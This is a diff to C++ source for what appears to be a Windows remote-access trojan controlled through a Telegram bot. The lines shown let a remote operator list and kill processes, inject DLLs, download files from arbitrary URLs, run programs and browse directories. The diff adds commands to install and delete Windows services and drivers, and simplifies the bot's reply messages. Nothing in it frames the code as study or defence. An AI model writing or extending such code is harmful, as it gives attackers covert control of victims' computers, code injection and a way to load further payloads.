@@ -28,6 +28,8 @@ SOFTWARE.
 
 #include "ProcessManager.h"
 #include "FileManager.h"
+#include "ServiceManager.h"
+
 #include "Information.h"
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
@@ -131,35 +133,29 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				if (command == "processes") {
 					std::string processes = ProcessList();
 					if (processes != "") {
-						std::string text = prefix + "%0A" + processes;
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, processes.c_str());
 					}
 					else {
-						std::string text = prefix + "%0AError! Processes not getting";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Error! Processes is empty");
 					}
 				}
 
 				// closeproc process.exe
 				else if (params[0] == "closeproc") {
 					if (CloseProcess(params[1])) {
-						std::string text = prefix + "%0ASuccess! Process is closed!";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Success! Process has been closed");
 					}
 					else {
-						std::string text = prefix + "%0AError! Process isn't closed!";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Error! Process isn't closed");
 					}
 				}
 
 				else if (params[0] == "inject_dll") {
 					if (InjectDLL(params[1].c_str(), params[2].c_str())) {
-						std::string text = prefix + "%0ASuccess! DLL is injected";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Success! DLL has been injected");
 					}
 					else {
-						std::string text = prefix + "%0AError! DLL isn't injected";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Error! DLL isn't injected");
 					}
 				}
 
@@ -167,12 +163,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				else if (params[0] == "loader") {
 					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
 					if (FileExists(params[2])) {
-						std::string text = prefix + "%0ASuccess! File is uploaded to: " + params[2];
+						std::string text = "Success! File is uploaded to: " + params[2];
 						api.SendTextMessage(s.chatid, text.c_str());
 					}
 					else {
-						std::string text = prefix + "%0AError! File not uploaded!";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Error! File not uploaded!");
 					}
 				}
 
@@ -180,13 +175,11 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 				else if (params[0] == "run") {
 					if (params.size() == 2) {
 						ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
-						std::string text = prefix + "%0ARunned with arguments!";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Success! Runned with arguments");
 					}
 					else {
 						ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
-						std::string text = prefix + "%0ARunned without arguments!";
-						api.SendTextMessage(s.chatid, text.c_str());
+						api.SendTextMessage(s.chatid, "Success! Runned without arguments");
 					}
 				}
 
@@ -216,17 +209,54 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 
 					// if only dir
 					else {
-						std::string objects = prefix + "%0A" + DirectoryObjectsList(params[1]);
+						std::string objects = DirectoryObjectsList(params[1]);
 						if (objects != "") {
 							api.SendTextMessage(s.chatid, objects.c_str());
 						}
 						else {
-							std::string text = prefix + "%0A Error! Files not found";
-							api.SendTextMessage(s.chatid, text.c_str());
+							api.SendTextMessage(s.chatid, "Error! Files not found!");
 						}
 					}
 				}
 
+				// SERVICE MANAGER
+				else if (params[0] == "service") {
+					// service show
+					if (params[1] == "show") {
+						std::string services = ServiceList();
+						if (services != "") {
+							api.SendTextMessage(s.chatid, services.c_str());
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Services is empty");
+						}
+					}
+
+					//    0     1     2          3                     4                         5            6
+					// service add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] 
+					else if (params[1] == "add") {
+						DWORD Type = ParseTypeDriver(params[5]);
+						DWORD StartType = ParseStartTypeDriver(params[6]);
+
+						if (AddService(params[2], params[3], params[4], Type, StartType)) {
+							api.SendTextMessage(s.chatid, "Success! Service has been added");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Service not added");
+						}
+					}
+
+					//          2
+					// delete [Name]
+					else if (params[1] == "delete") {
+						if (DeleteSvc(params[2])) {
+							api.SendTextMessage(s.chatid, "Success! Service has been deleted");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Service not deleted");
+						}
+					}
+				}
 			}
 			else if (last == "/online") {
 				api.SendTextMessage(s.chatid, information.c_str());
